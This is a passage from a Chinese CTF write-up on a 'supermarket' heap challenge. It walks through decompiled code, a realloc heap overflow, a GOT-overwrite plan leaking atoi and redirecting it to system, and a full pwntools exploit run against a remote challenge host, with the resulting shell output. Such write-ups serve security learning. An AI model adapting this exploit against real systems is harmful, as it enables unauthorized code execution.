punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>src<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//自制read函数，最多向src里面读入16-1 个字节</span>  v5 <span class="token operator">=</span> <span class="token function">check_repeat</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>src<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"name exist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token function">check_space</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"no more space"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">(</span><span class="token operator">&amp;</span>bss_goods<span class="token punctuation">)</span><span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x1Cu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//这里将会生成一个0x20大小的chunk，其user data指针放在bss_goods中 -----chunk1</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>bss_goods<span class="token punctuation">)</span><span class="token punctuation">[</span>v5<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>src<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"name:%s\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>src<span class="token punctuation">)</span><span class="token punctuation">;</span>  v4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"price:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v4 <span class="token operator">=</span> <span class="token function">read_int</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//自制read函数 有atoi进行字符向整数转换</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"price:%d\n"</span><span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> v4 <span class="token operator">&lt;=</span> <span class="token number">999</span> <span class="token punctuation">)</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>bss_goods<span class="token punctuation">)</span><span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">=</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//取bss_goods里面的指针（chunk_ptr）并转换为_DWORD *（指针）+ 4 再整体解引用 ，存放价格</span>  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>bss_goods<span class="token punctuation">)</span><span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>bss_goods<span class="token punctuation">)</span><span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>bss_goods<span class="token punctuation">)</span><span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">256</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 检查price下面的值</span>  <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"descrip_size:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>bss_goods<span class="token punctuation">)</span><span class="token punctuation">[</span>v5<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">read_int</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//和上面price的存法一致，这里存放 descrip_size</span>  <span class="token punctuation">}</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"descrip_size:%d\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>bss_goods<span class="token punctuation">)</span><span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>bss_goods<span class="token punctuation">)</span><span class="token punctuation">[</span>v5<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v2 <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>bss_goods<span class="token punctuation">)</span><span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 取bss_goods里面的指针（chunk_ptr）并转换为_DWORD *（指针）+ 6 再整体解引用，</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"description:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                           <span class="token comment" spellcheck="true">//然后存放malloc之后的返回地址，这里的malloc的参数是descrip_size ----chunk2</span>  <span class="token keyword">return</span> <span class="token function">read_buf_n</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>bss_goods<span class="token punctuation">)</span><span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>bss_goods<span class="token punctuation">)</span><span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//往chunk2中输入信息，最大字节数为descrip_size -1</span><span class="token punctuation">}</span></code></pre><p>经典堆题add函数不能放过，附上数据结构图：古有得民心者得天下，现有得结构者得天下<br><img src="https://s1.ax1x.com/2020/09/14/ws9Or8.png" alt=""><br>来看看list函数：</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// esi</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ebx</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// edi</span>  size_t v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ebx</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// esi</span>  size_t v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ebx</span>  size_t v8<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  size_t v9<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">785</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Bh] [ebp-32Dh]</span>  <span class="token keyword">int</span> goods_index<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+31Ch] [ebp-1Ch]</span>  <span class="token function">memset</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x311u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> goods_index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> goods_index <span class="token operator">&lt;=</span> <span class="token number">15</span><span class="token punctuation">;</span> <span class="token operator">++</span>goods_index <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//对bss数组进行检索</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>bss_goods<span class="token punctuation">)</span><span class="token punctuation">[</span>goods_index<span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>bss_goods<span class="token punctuation">)</span><span class="token punctuation">[</span>goods_index<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0x10</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">// if  len(goods_descrip) > 0x10</span>      <span class="token punctuation">{</span>        v4 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>bss_goods<span class="token punctuation">)</span><span class="token punctuation">[</span>goods_index<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// v4 == price</span>        v5 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>bss_goods<span class="token punctuation">)</span><span class="token punctuation">[</span>goods_index<span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">// v5 == name_addr 注意这个是地址</span>        v6 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>                         <span class="token comment" spellcheck="true">// v6 == 0</span>        <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">[</span>v6<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"%s: price.%d, des."</span><span class="token punctuation">,</span> v5<span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// name_str: price.v4_price, des.  %s通过name_addr 地址找到字符串</span>        v7 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>bss_goods<span class="token punctuation">)</span><span class="token punctuation">[</span>goods_index<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// v7 == descrip_addr  地址</span>        v8 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">[</span>v8<span class="token punctuation">]</span><span class="token punctuation">,</span> v7<span class="token punctuation">,</span> <span class="token number">0xDu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment" spellcheck="true">// chunk2_addr 地址解析 获得description_str</span>        v9 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">[</span>v9<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"...\n"</span><span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span>      <span class="token punctuation">{</span>        v0 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>bss_goods<span class="token punctuation">)</span><span class="token punctuation">[</span>goods_index<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// v0 == chunk2_addr 即descrip_addr</span>        v1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>bss_goods<span class="token punctuation">)</span><span class="token punctuation">[</span>goods_index<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// v1 == price</span>        v2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>bss_goods<span class="token punctuation">)</span><span class="token punctuation">[</span>goods_index<span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">// v2 == name_addr == chunk1_addr</span>        v3 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">[</span>v3<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"%s: price.%d, des.%s\n"</span><span class="token punctuation">,</span> v2<span class="token punctuation">,</span> v1<span class="token punctuation">,</span> v0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// name_str: price.price, des.descrip_str\n    chunk2_addr地址解析</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"all  commodities info list below:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>分析这里的地址解析可知，数据结构中第二个chunk_addr是我们的攻击目标</strong></p><p>再看看change_descrip函数：</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">change_descri</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">int</span> size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>  v1 <span class="token operator">=</span> <span class="token function">repeat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"not exist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> size <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">||</span> size <span class="token operator">></span> <span class="token number">0x100</span><span class="token punctuation">;</span> size <span class="token operator">=</span> <span class="token function">read_int</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//我觉的这里是在提示我们新的size范围是0~0x100，要不然跳不出去</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"descrip_size:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>bss_goods<span class="token punctuation">)</span><span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">!=</span> size <span class="token punctuation">)</span>    <span class="token function">realloc</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>bss_goods<span class="token punctuation">)</span><span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// if size>chunk_size_old ===>free(chunk_old)</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"description:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                           <span class="token comment" spellcheck="true">//修改商品的description内容即 chunk2</span>  <span class="token keyword">return</span> <span class="token function">read_buf_n</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>bss_goods<span class="token punctuation">)</span><span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>bss_goods<span class="token punctuation">)</span><span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//这里在修改chunk大小后，读入数据</span><span class="token punctuation">}</span>                                                                                           <span class="token comment" spellcheck="true">//然而读入的最大字节数由descrip_size-1控制</span></code></pre><p>所以如果我把原本descrip_size定义的一个很大的chunk realloc为 一个很小的chunk，而之后的重新读入数据又是看descrip_size，所以这里会存在堆溢出。</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ul><li>list函数可用其地址解析特点来泄露真实函数地址，达到任意地址读功能</li><li>change函数用来改变descrip_chunk-&gt;size，达到堆溢出目的，通过覆盖((_DWORD *)(&amp;bss_goods)[v1] + 6)的值，可以达到任意地址写功能。<ul><li>add(‘AAAA’,0x100,’’)     第一个参数是name，第二个是description_size 第三个是 描述字符串</li><li>change(‘AAAA’,0x8,’’)   把原来mallo(0x100)的chunk改为malloc(0x8)剩余的free chunk因为不能放在fastbin，而又与top chunk相邻 所以会融合</li><li>add(‘BBBB’,0x8,’’)  堆管理器会以为AAAA的description chunk 变成了 malloc(0x8) ，然后这个BBBB的两个chunk就和AAAA很近，达到堆溢出覆盖的目的</li><li>示意图为：<br><img src="https://s1.ax1x.com/2020/09/14/ws9XqS.png" alt=""></li><li>再次change（AAAA）这次让realloc的size参数等于descrip_size(0x100) 就可以绕过realloc 函数直接读取字符串，覆盖BBBB的第二个chunk_ptr，为atoi_got,执行show泄露地址</li><li>继续change（BBBB）就可以向atoi_got指向的地方读入system真实地址。</li><li>输入/bin/sh即可</li></ul></li></ul><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">)</span>atoi_addr <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>size<span class="token punctuation">,</span>descrip<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'100'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>descrip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'your choice>> '</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'des.'</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'des.'</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>    atoi_addr<span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"####address leaking####"</span>        <span class="token keyword">print</span> hex<span class="token punctuation">(</span>atoi_addr<span class="token punctuation">)</span>    <span class="token keyword">return</span> atoi_addr<span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>size<span class="token punctuation">,</span>descrip<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'your choice>> '</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'name:'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'descrip_size:'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'description:'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>descrip<span class="token punctuation">)</span><span class="token punctuation">)</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'220.249.52.133'</span><span class="token punctuation">,</span><span class="token number">49720</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'supermarket'</span><span class="token punctuation">)</span>libc_local <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc.so.6'</span><span class="token punctuation">)</span>atoi_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#sh = process('./supermarket')</span>add<span class="token punctuation">(</span><span class="token string">'AAAA'</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token string">'AAAA'</span><span class="token punctuation">,</span><span class="token number">0x8</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'BBBB'</span><span class="token punctuation">,</span><span class="token number">0x8</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">16</span> <span class="token operator">+</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span> <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">12</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>atoi_got<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#这里用于覆盖的payload要小心构造</span>change<span class="token punctuation">(</span><span class="token string">'AAAA'</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>                                                 <span class="token comment" spellcheck="true">#保证下次change('BBBB',0x8,p32(system_addr))</span>atoi_addr <span class="token operator">=</span> show<span class="token punctuation">(</span><span class="token punctuation">)</span>libc_addr <span class="token operator">=</span> atoi_addr <span class="token operator">-</span> libc_local<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc_local<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>change<span class="token punctuation">(</span><span class="token string">'BBBB'</span><span class="token punctuation">,</span><span class="token number">0x8</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：我在本地失败了，应该是环境问题</p><pre class=" language-java"><code class="language-java">your choice<span class="token operator">>></span> $ <span class="token operator">/</span>bin<span class="token operator">/</span>sh<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x8</span> bytes<span class="token operator">:</span>    <span class="token string">'/bin/sh\n'</span>$ ls<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x3</span> bytes<span class="token operator">:</span>    <span class="token string">'ls\n'</span><span class="token 